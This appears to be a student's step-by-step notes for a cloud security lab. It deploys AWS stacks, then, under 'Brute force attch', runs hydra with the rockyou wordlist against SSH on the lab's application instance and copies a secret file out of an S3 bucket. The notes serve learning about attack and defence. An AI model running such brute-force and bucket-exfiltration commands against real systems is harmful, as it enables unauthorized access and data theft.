# Step by step

```bash
aws cloudformation create-stack --region us-east-1 --stack-name c3-s3 --template-body file://starter/c3-s3.yml

aws cloudformation create-stack --region us-east-1 --stack-name c3-vpc --template-body file://starter/c3-vpc.yml

aws cloudformation create-stack --region us-east-1 --stack-name c3-app --template-body file://starter/c3-app.yml --parameters ParameterKey=KeyPair,ParameterValue=udacity-new --capabilities CAPABILITY_IAM
```

```
// S3
BucketNameRecipesSecret	cand-c3-secret-recipes-186104823600
BucketNameRecipesFree	cand-c3-free-recipes-186104823600
```

```
// app
ApplicationInstanceIP	ec2-54-227-185-36.compute-1.amazonaws.com
ApplicationURL	c1-web-service-alb-44787709.us-east-1.elb.amazonaws.com
AttackInstanceIP	ec2-54-91-77-229.compute-1.amazonaws.com
```

```bash
aws s3 cp ./starter/free_recipe.txt s3://cand-c3-free-recipes-186104823600/ --region us-east-1
aws s3 cp ./starter/secret_recipe.txt s3://cand-c3-secret-recipes-186104823600/ --region us-east-1
```

### Brute force attch

```bash
cd Downloads
chmod 400 udacity-new.pem
ssh -i udacity-new.pem ubuntu@ec2-54-91-77-229.compute-1.amazonaws.com

date
hydra -l ubuntu -P rockyou.txt ssh://ec2-54-227-185-36.compute-1.amazonaws.com

# view the files in the secret recipes bucket
aws s3 ls  s3://cand-c3-secret-recipes-186104823600/ --region us-east-1

# download the files
aws s3 cp s3://cand-c3-secret-recipes-186104823600/secret_recipe.txt  .  --region us-east-1

# view contents of the file
cat secret_recipe.txt
```
